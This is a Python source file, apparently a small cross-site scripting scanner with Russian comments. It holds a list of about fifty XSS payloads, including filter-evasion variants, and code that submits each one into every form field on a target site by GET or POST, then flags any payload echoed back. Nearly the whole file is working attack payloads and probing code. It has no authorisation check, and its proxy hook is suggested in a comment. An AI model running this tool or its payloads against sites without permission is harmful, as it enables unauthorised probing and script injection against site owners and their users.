import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\" onmouseover=\"alert(1)",
    "' onfocus='alert(1)",
    "<INPUT TYPE=\"IMAGE\" SRC=\"x\" ONERROR=\"alert(1)\">",
    "<marquee onstart=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>",
    "<embed src=\"data:image/svg+xml;base64,...\">",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<isindex onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<svg><a xlink:href=\"javascript:alert(1)\">CLICK</a></svg>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<math><mi xlink:href=\"javascript:alert(1)\">X</mi></math>",
    "<img src=x onerror=alert(1)>",
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<image/src/onerror=prompt(8)>",
    "<img/src/onerror=prompt(8)>",
    "<image src/onerror=prompt(8)>",
    "<img src/onerror=prompt(8)>",
    "<image src =q onerror=prompt(8)>",
    "<img src =q onerror=prompt(8)>",
    "</scrip</script>t><img src =q onerror=prompt(8)>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<input onfocus=alert(1) autofocus>",
    "<video><source onerror='alert(1)'></video>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//<</script>",
    "<script/src=data:text/javascript,alert(1)>",
    "<svg><script xlink:href=data:,alert(1)></script></svg>",
    "<img ''='' onerror=alert(1)>",
    "<img src=x:alert(1) onerror=eval(src)>",
    "<a href=JaVaScRiPt:alert(1)>click</a>",
    "<script>/*--><script>alert(1)//--></script>",
    "<script>eval('alert(1)')</script>",
    "<script>prompt(1337)</script>",
    "<script>confirm('XSS')</script>",
    "<img src=1 onerror=eval('alert(1)')>",
    "<script>Function('alert(1)')()</script>"
]

class Xsscanner:
    def __init__(self, url):
        self.target = url
        self.session = requests.Session()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Xssscan)"
        }
        self.proxy = {}   #если хочешь то можешь добавить сюда прокси

    def log(self, text: str):
        print(text)

    def scan_forms(self, url):
        try:
            resp = self.session.get(url, headers=self.headers, proxies=self.proxy)
            soup = BeautifulSoup(resp.text, "html.parser")
            return soup.find_all("form")
        except Exception as e:
            self.log(f"Ошибка при сканировании формы: {e}")
            return []


def start_scan(xss_obj):
    vulns = []
    xss_obj.log("[*] Проверка XSS:")
    forms = xss_obj.scan_forms(xss_obj.target)
    xss_obj.log(f"   Найдено форм: {len(forms)}")

    for form in forms:
        action = form.get("action") or xss_obj.target
        method = form.get("method", "get").lower()
        inputs = form.find_all(["input", "textarea"])

        for payload in XSS_PAYLOADS:
            data = {i.get("name"): payload for i in inputs if i.get("name")}
            url = urljoin(xss_obj.target, action)

            try:
                if method == "post":
                    resp = xss_obj.session.post(url, data=data, headers=xss_obj.headers, proxies=xss_obj.proxy)
                else:
                    resp = xss_obj.session.get(url, params=data, headers=xss_obj.headers, proxies=xss_obj.proxy)
                if payload in resp.text:
                    xss_obj.log(f"[+] XSS уязвимость: {url} ({payload})")
                    vulns.append(f"{url} ({payload})")

            except Exception as e:
                xss_obj.log(f"Ошибка при отправке запроса: {e}")
                continue

    return vulns
